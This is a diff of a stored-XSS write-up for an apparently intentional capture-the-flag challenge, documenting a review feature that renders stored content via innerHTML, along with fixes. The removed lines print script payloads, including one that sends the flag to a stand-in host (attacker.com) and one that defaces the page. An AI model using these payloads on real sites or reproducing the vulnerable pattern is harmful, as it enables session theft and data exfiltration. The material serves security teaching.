@@ -1,153 +1,71 @@
-# Cross-Site Scripting (XSS) - Stored
+# Stored Cross-Site Scripting (XSS)
 
 ## Overview
 
-This vulnerability demonstrates a critical security flaw where the application stores user-supplied content without proper sanitization and renders it directly in the browser. This allows attackers to inject malicious JavaScript code that executes in the context of other users' browsers when they view the affected content.
+Stored XSS happens when user-supplied content is persisted by the server and later rendered as HTML in another user's browser. The injected markup runs with the privileges of the rendering origin, so anything the page can do — read cookies, call APIs, deface the UI — the attacker can do too.
+
+In this challenge, the product review feature accepts a `content` string from the API, stores it as-is, and the product page renders it via `element.innerHTML = review.content`, bypassing React's automatic escaping.
 
 ## Why This Is Dangerous
 
-### Stored XSS Attack Vector
+- **Persistent compromise** — every visitor to the affected product page runs the attacker's code.
+- **Session hijacking and account takeover** — any data the rendering page can read (storage, in-memory state, CSRFable endpoints) is reachable.
+- **Phishing inside the trusted origin** — injected markup can rewrite the page to harvest credentials.
+- **Privilege escalation** — admins viewing the page execute the payload with their privileges.
 
-When an application stores user input and displays it without proper encoding or sanitization, it creates a persistent attack vector:
+## Vulnerable Code
 
-1. **Persistent attack** - The malicious script is stored in the database and executed every time the content is viewed
-2. **Session hijacking** - Attackers can steal authentication tokens and session cookies
-3. **Phishing attacks** - Malicious scripts can modify page content to trick users
-4. **Data exfiltration** - Scripts can send sensitive user data to attacker-controlled servers
-5. **Privilege escalation** - Scripts can perform actions on behalf of authenticated users
-
-## The Vulnerability
-
-In this application, the product review system is vulnerable to stored XSS attacks. The vulnerability exists in two places:
-
-1. **API endpoint** (`/api/products/[id]/reviews`) - Accepts review content without sanitization
-2. **Frontend component** (`ProductDetailClient`) - Renders review content without any encoding
-
-### Vulnerable Code
-
-**API Endpoint (No Sanitization):**
+The API stores the review body verbatim:
 
 ```typescript
 const review = await prisma.review.create({
   data: {
     productId: id,
-    content: content.trim(), // ❌ No sanitization
+    content: content.trim(),
     author,
   },
 });
 ```
 
-**Frontend Rendering (Unsafe HTML Injection):**
+The product page injects the stored content as raw HTML:
+
+```tsx
+useEffect(() => {
+  reviews.forEach((review) => {
+    const reviewElement = reviewRefs.current[review.id];
+    if (reviewElement && reviewElement.innerHTML !== review.content) {
+      reviewElement.innerHTML = review.content;
+    }
+  });
+}, [reviews]);
+```
+
+`element.innerHTML = ...` parses the assigned string as HTML and executes any `<script>` or event-handler attributes inside it. React would normally escape `{review.content}`; using `innerHTML` opts back into the unsafe path.
+
+## Secure Implementation
+
+Render text as text. React's default JSX interpolation escapes HTML entities, so the simplest fix is to delete the imperative `innerHTML` assignment and let JSX handle it:
+
+```tsx
+<div className="text-slate-700 dark:text-slate-300">{review.content}</div>
+```
+
+If reviewers really need rich text, sanitize on the server before storing _and_ on the client before rendering, and only allow a small allowlist of tags and attributes:
 
 ```typescript
-<div
-  ref={(el) => {
-    reviewRefs.current[review.id] = el;  // ❌ Direct HTML injection
-  }}
-  className="text-slate-700 dark:text-slate-300"
-/>
-```
-
-## Exploitation
-
-### How to Retrieve the Flag
-
-To retrieve the flag, you need to exploit the stored XSS vulnerability to read a sensitive file exposed at the application root.
-
-**Exploitation Steps:**
-
-1. Navigate to any product page (e.g., `/products/[id]`)
-2. Scroll down to the "Reviews" section
-3. In the review form, enter a malicious JavaScript payload that fetches and displays the flag file:
-
-```html
-<script>
-  fetch("/xss-flag.txt")
-    .then((r) => r.text())
-    .then((flag) => {
-      alert("Flag: " + flag);
-    });
-</script>
-```
-
-4. Submit the review
-5. The malicious script will be stored in the database
-6. When any user (including yourself) views the product page, the script will execute and display the flag
-
-**Alternative Payload (Display in DOM):**
-
-```html
-<script>
-  fetch("/xss-flag.txt")
-    .then((r) => r.text())
-    .then((flag) => {
-      const div = document.createElement("div");
-      div.style.cssText =
-        "position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;color:#0f0;padding:20px;font-family:monospace;z-index:9999";
-      div.textContent = flag;
-      document.body.appendChild(div);
-    });
-</script>
-```
-
-**Alternative Payload (Exfiltrate to Remote Server):**
-
-```html
-<script>
-  fetch("/xss-flag.txt")
-    .then((r) => r.text())
-    .then((flag) => {
-      fetch("https://attacker.com/collect?flag=" + encodeURIComponent(flag));
-    });
-</script>
-```
-
-**Alternative Payload (Defacing the Page):**
-
-```html
-<script>
-  document.body.innerHTML = "<h1>Hacked by XSS!</h1>";
-</script>
-```
-
-### Secure Implementation
-
-```typescript
-// ✅ SECURE - Sanitize on server
 import DOMPurify from "isomorphic-dompurify";
 
-const review = await prisma.review.create({
-  data: {
-    productId: id,
-    content: DOMPurify.sanitize(content.trim()), // Sanitize before storing
-    author,
-  },
+const safe = DOMPurify.sanitize(content.trim(), {
+  ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br"],
+  ALLOWED_ATTR: [],
 });
 ```
 
-```typescript
-// ✅ SECURE - Use React's built-in escaping
-<div className="text-slate-700 dark:text-slate-300">
-  {review.content} {/* React automatically escapes HTML */}
-</div>
-```
-
-```typescript
-// ✅ SECURE - If HTML is needed, sanitize before rendering
-import DOMPurify from 'isomorphic-dompurify';
-
-<div
-  className="text-slate-700 dark:text-slate-300"
-  dangerouslySetInnerHTML={{
-    __html: DOMPurify.sanitize(review.content)
-  }}
-/>
-```
+Layer a strict Content Security Policy (`default-src 'self'; script-src 'self'`) so that even if escaping fails, inline scripts and remote scripts are blocked. Output encoding is the primary defense; CSP is the safety net.
 
 ## References
 
-- [OWASP Top 10 - Cross-Site Scripting (XSS)](<https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)>)
+- [OWASP — Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 - [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
-- [React Security - dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
-- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [MDN — Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
